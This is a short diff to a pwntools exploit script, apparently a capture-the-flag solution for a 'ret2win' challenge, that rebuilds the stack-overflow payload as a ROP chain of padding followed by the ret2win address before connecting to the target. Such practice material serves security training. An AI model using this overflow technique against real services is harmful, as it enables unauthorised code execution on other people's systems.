@@ -23,7 +23,10 @@ BUFFER_SIZE = 32 + 8
 READ_SIZE = 56
 
 def main():
-    payload = flat({BUFFER_SIZE + context.bytes: elf.symbols.ret2win})
+    rop = ROP(elf)
+    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
+    rop.raw(elf.symbols.ret2win)
+    payload = rop.chain()
     assert len(payload) <= READ_SIZE
 
     c = connection()
